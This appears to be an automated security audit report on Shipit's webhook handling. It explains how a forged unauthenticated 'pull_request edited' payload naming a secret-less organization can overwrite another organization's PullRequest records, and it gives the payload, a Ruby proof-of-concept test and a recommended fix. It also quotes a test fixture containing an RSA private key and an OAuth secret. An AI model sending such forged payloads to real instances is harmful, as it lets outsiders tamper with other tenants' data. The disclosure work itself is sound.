### Title
Webhook signature verification is keyed on `repository.owner.login`, but `EditedHandler` (and all handlers) mutate state keyed on the independent `repository.full_name` field, letting an attacker forge a `pull_request` `edited` payload against any victim repository by claiming ownership of a Shipit-configured "no-secret" organization - ([File: app/controllers/shipit/webhooks_controller.rb], [File: app/models/shipit/webhooks/handlers/pull_request/edited_handler.rb])

### Summary
`Shipit::WebhooksController#verify_signature` selects the `GitHubApp` (and thus the HMAC secret) using `params.dig('repository','owner','login')`, and `GitHubApp#verify_webhook_signature` returns `true` unconditionally when that app's `webhook_secret` is blank. `EditedHandler`, however, resolves the actual `Repository`/`Stack`/`PullRequest` to mutate using the independent `params.repository.full_name` field. Because the controller never checks that these two fields agree, an attacker can pass signature verification by naming a Shipit-configured organization that has no `webhook_secret`, while pointing `repository.full_name` at a completely different, properly-secured victim organization's repository, causing `EditedHandler` to overwrite that victim's `PullRequest` record (and create a `Commit`) without ever passing that victim's HMAC check.

### Finding Description
The invariant the question wants tested is: "A `pull_request` event only affects the repository/stack whose secret authenticated it." The actual bindings in the code are two independently-read fields from the same JSON body:

- Verification side: `repository_owner = params.dig('repository', 'owner', 'login')` [1](#0-0)  feeds `Shipit.github(organization: repository_owner)`, whose `verify_webhook_signature` returns `true` with no HMAC check at all if that org's `webhook_secret` is blank [2](#0-1) .
- Mutation side: `EditedHandler#repository` resolves the record to touch from `params.repository.full_name` via `Shipit::Repository.from_github_repo_name`, which just splits `"owner/name"` and does a `find_by` [3](#0-2) [4](#0-3) . The `PullRequest` lookup joins on that resolved `repository.id` and `params.number` [5](#0-4) , then `process` calls `pull_request.update(github_pull_request: params.pull_request)` [6](#0-5) .

Nothing in `create`, `verify_signature`, or `EditedHandler` requires `repository.full_name.split('/').first == repository_owner`. An attacker who owns/controls a repo under any Shipit-configured org whose config omits `webhook_secret` (this is an explicitly documented, supported configuration — the setup docs call the webhook secret "optional" [7](#0-6) , and the multi-org test fixture ships two orgs both with `webhook_secret: # nil` [8](#0-7) ) can send:

```
X-Github-Event: pull_request
{
  "action": "edited",
  "number": <victim PR number>,
  "repository": { "owner": { "login": "no-secret-org" }, "full_name": "victim-org/victim-repo" },
  "pull_request": { ...attacker-controlled fields... },
  "sender": { "login": "attacker" }
}
```
`verify_signature` authenticates against `no-secret-org` (trivially, since its secret is blank) and never touches `victim-org`'s real secret, yet `EditedHandler` writes to `victim-org/victim-repo`'s `PullRequest`, updating `title`, `state`, `additions`, `deletions`, `user`, `assignees`, `labels`, and `head` [9](#0-8) , and can create a new `Commit` row on the victim's stack via `find_or_create_commit_from_github_by_sha!` [10](#0-9) .

Existing guards do not stop this: `drop_unhandled_event` and `ExplicitParameters` only validate payload shape, not organization/ownership consistency; `force_github_authentication`/`User#authorized?` do not apply to this unauthenticated webhook endpoint; and `Repository#from_github_repo_name` performs no cross-check against the org used for signing.

One correction to the question's own framing: `EditedHandler` and `Repository#from_github_repo_name` contain no environment-conditional logic — `Stack#environment` ("production" vs otherwise) is never read in this code path, so "production environment" does not amplify or change the mechanics of this bug. The vulnerability is identical for any stack regardless of environment; it stems purely from the owner/full_name binding gap, not from any production-specific code.

### Impact Explanation
A payload authenticated only against an attacker-controlled, secret-less organization can mutate a `PullRequest` record — and transitively create a `Commit` record — belonging to a completely different, properly-secured victim repository's `Stack`. This matches the "a payload for one repository mutating another's stack, commit, task or team" Critical criterion. It is repeatable against any victim repository/stack whose full name the attacker can guess or discover (GitHub repo names/owners are generally public), as long as at least one other org in the same Shipit instance is configured with a blank `webhook_secret`. `EditedHandler` itself does not directly trigger a deploy, rollback, or merge — its blast radius is limited to falsifying `PullRequest` metadata/commit records for the victim stack, not to running arbitrary deploy commands.

### Likelihood Explanation
Preconditions: the Shipit instance must have at least one GitHub organization configured without a `webhook_secret` (a supported, documented configuration) and a target victim repository/stack registered under a different org. No Shipit session, API token, or GitHub secret is required — only knowledge of the no-secret org's name (visible in Shipit UI/URLs) and the victim repository's `owner/name`, plus an existing `PullRequest` number on that stack (also discoverable via Shipit's own UI or GitHub). Attacker cost is a single unauthenticated HTTP POST, fully repeatable.

### Recommendation
In `Shipit::WebhooksController#verify_signature`, after resolving the signing organization from `repository.owner.login`, also verify that `params.dig('repository','full_name')` belongs to that same organization (e.g., `full_name.split('/').first.casecmp?(repository_owner)`) before dispatching to handlers; reject the request with `422` on mismatch. Additionally, consider requiring a non-blank `webhook_secret` for every configured organization in production, since `verify_webhook_signature`'s "trust unsigned payloads" fallback is unsafe once any other org shares the same Shipit instance.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_test.rb
test "no-secret org cannot mutate another org's PullRequest via edited event" do
  # Setup: two orgs configured in Shipit.github — "no-secret-org" (blank webhook_secret)
  # and "victim-org" (webhook_secret: "s3cr3t"), matching the shape of
  # test/dummy/config/secrets_double_github_app.yml.
  repository = shipit_repositories(:shipit) # owner: "victim-org", name: "repo"
  stack = repository.stacks.first
  pull_request = stack.pull_requests.create!(number: 42, title: "Old Title", ...)

  forged_owner = "no-secret-org"          # equality claimed broken:
  actual_owner = repository.owner          # forged_owner != actual_owner
  assert_not_equal forged_owner, actual_owner

  request.headers['X-Github-Event'] = 'pull_request'
  # no valid X-Hub-Signature for victim-org's real secret is supplied
  body = {
    action: "edited",
    number: pull_request.number,
    repository: { owner: { login: forged_owner }, full_name: repository.full_name },
    pull_request: { id: 1, number: pull_request.number, url: "...", title: "HACKED",
                     state: "open", additions: 1, deletions: 1,
                     head: { sha: some_known_sha, ref: "attacker-branch" },
                     user: { login: "attacker" }, assignees: [], labels: [] },
    sender: { login: "attacker" }
  }.to_json

  post :create, body: body, as: :json

  assert_response :ok # verify_signature passed via the no-secret org, not victim-org's secret
  assert_equal "HACKED", pull_request.reload.title # victim's record mutated cross-tenant
end
```
Both sides of the equality (`repository_owner` used to select the signing app vs. the org embedded in `repository.full_name` used to select the mutated record) diverge, and no code path forces them to match — confirming the vulnerability.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/edited_handler.rb (L41-45)
```ruby
          def process
            return unless respond_to_pull_request_edited?

            pull_request.update(github_pull_request: params.pull_request) if pull_request.present?
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/edited_handler.rb (L49-61)
```ruby
          def pull_request
            @pull_request ||= Shipit::PullRequest
                              .joins(:stack, stack: :repository)
                              .find_by(
                                number: params.number,
                                stacks: {
                                  repositories:
                                    {
                                      id: repository.id
                                    }
                                }
                              )
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/edited_handler.rb (L63-65)
```ruby
          def repository
            Shipit::Repository.from_github_repo_name(params.repository.full_name) || Shipit::NullRepository.new
          end
```

**File:** app/models/shipit/repository.rb (L53-56)
```ruby
    def self.from_github_repo_name(github_repo_name)
      repo_owner, repo_name = github_repo_name.downcase.split('/')
      find_by(owner: repo_owner, name: repo_name)
    end
```

**File:** docs/setup.md (L29-30)
```markdown
  - Webhook URL: It must be set to `<homepage>/webhooks`, e.g. `https://example.com/webhooks`.
  - Webhook secret (optional): Fill it with some randomly generated string, and *keep it in clear on the side, you'll need it later*.
```

**File:** test/dummy/config/secrets_double_github_app.yml (L1-46)
```yaml
  github:
    OrgOne:
      domain: # defaults to github.com
      app_id: 42
      installation_id: 43
      bot_login: "shipit[bot]"
      webhook_secret: # nil
      # Randomly generated
      private_key: |
        -----BEGIN RSA PRIVATE KEY-----
        MIIEpAIBAAKCAQEA7iUQC2uUq/gtQg0gxtyaccuicYgmq1LUr1mOWbmwM1Cv63+S
        73qo8h87FX+YyclY5fZF6SMXIys02JOkImGgbnvEOLcHnImCYrWs03msOzEIO/pG
        M0YedAPtQ2MEiLIu4y8htosVxeqfEOPiq9kQgFxNKyETzjdIA9q1md8sofuJUmPv
        ibacW1PecuAMnn+P8qf0XIDp7uh6noB751KvhCaCNTAPtVE9NZ18OmNG9GOyX/pu
        pQHIrPgTpTG6KlAe3r6LWvemzwsMtuRGU+K+KhK9dFIlSE+v9rA32KScO8efOh6s
        Gu3rWorV4iDu14U62rzEfdzzc63YL94sUbZxbwIDAQABAoIBADLJ8r8MxZtbhYN1
        u0zOFZ45WL6v09dsBfITvnlCUeLPzYUDIzoxxcBFittN6C744x3ARS6wjimw+EdM
        TZALlCSb/sA9wMDQzt7wchhz9Zh2H5RzDu+2f54sjDh38KqancdT8PO2fAFGxX/b
        qicOVyeZB9gv6MJtJc20olBbuXAeBNfcDABF9oxF+0i+Ssg7B4VXiqgcjtGbr/Og
        qRll7AqyTArVx2xEcVfZxeZ4zGnigzcJq4te7yYpxzwk+RxblkPh54Yt4WxZ+8DI
        Rsn3r6ajlpwzpwvsJFU2Txq7xBTzGQMFmy/Pnjk83kP2cogxB2+tRyjITGqTwD8b
        gg9PFCkCgYEA+7u8A0l0Cz6p0SI6c7ftVePVRiIhpawWN7og/wEmI6zUjm/3rA+R
        hrhaVKuOD8QF/HdDsqTck5gjGAjTmJz6r33/cl1Tz+pr62znsrB4r0yMKvQbKN81
        WGaWOsi2+ZXqLNv5h5wpUF0MTKlXHeKnwP5kuEvGwVn6WURFCh6PhLMCgYEA8i5e
        JjulJVGyd5HuoY3xyO7E6DjidsqRnVRq+hYpORjnHvTmSwe4+tH4ha2p9Kv2Y6k3
        C1NYY/fSMQoYCCRaYyJleI+la/9tsZqAmtms4ZB8KhFmPHf9fW75i6G0xKWyZ8K+
        E2Ft/UaEiM282593cguV6+Kt5uExnyPxLLK4FlUCgYEAwRJ/JGI8/7bjFkTTYheq
        j5q75BufhOrU6471acAe2XPgXxLfefdC3Xodxh0CS3NESBvNL4Ikr4sbN37lk4Kq
        /th7iOKtuqUIeru/hZy2I3VpeDRbdGCmEJQ2GwYA2LKztg5Nd0Y9paaIHXAwIfrK
        QUqcQ4HTAk8ZpUeoUBeaaeMCgYANLmbjb9WiPVsYVPIHCwHA7PX8qbPxwT7BsGmO
        KQyfVfKmZa/vH4F67Vi4deZNMdrcO8aKMEQcVM2065a5QrlEsgeR00eupB1lUEJ1
        qylUsZeAdqf43JMIc7TTW77KATa/nQLZbTEeWus1wvTngztuEqFbUGAks9cOkVc8
        FpIcbQKBgQDVIL8gPLmn0f+4oLF8MBC+oxtKpz14X5iJ1saGFkzW5I+nIEskpS0S
        qtirnTCnJFGdCrFwctnxiuiCmyGwpBYdjIfHyvYAHnqAtMnESzCUyeSFZiquVW5W
        MvbMmDPoV27XOHU9kIq6NXtfrkpufiyo6/VEYWozXalxKLNuqLYfPQ==
        -----END RSA PRIVATE KEY-----
      oauth:
        id: Iv1.bf2c2c45b449bfd9
        secret: ef694cd6e45223075d78d138ef014049052665f1
        teams:
    OrgTwo:
      domain: # defaults to github.com
      app_id: 42
      installation_id: 43
      bot_login: "shipit[bot]"
      webhook_secret: # nil
```

**File:** app/models/shipit/pull_request.rb (L36-50)
```ruby
    def github_pull_request=(github_pull_request)
      self.github_id = github_pull_request.id
      self.number = github_pull_request.number
      self.api_url = github_pull_request.url
      self.title = github_pull_request.title
      self.state = github_pull_request.state
      self.additions = github_pull_request.additions
      self.deletions = github_pull_request.deletions
      self.user = User.find_or_create_by_login!(github_pull_request.user.login)
      self.assignees = github_pull_request.assignees.map do |github_user|
        User.find_or_create_by_login!(github_user.login)
      end
      self.labels = github_pull_request.labels.map(&:name)
      self.head = find_or_create_commit_from_github_by_sha!(github_pull_request.head.sha)
    end
```

**File:** app/models/shipit/pull_request.rb (L52-61)
```ruby
    def find_or_create_commit_from_github_by_sha!(sha)
      if commit = stack.commits.by_sha(sha)
        commit
      else
        github_commit = stack.github_api.commit(stack.github_repo_name, sha)
        stack.commits.create_from_github!(github_commit)
      end
    rescue ActiveRecord::RecordNotUnique
      retry
    end
```
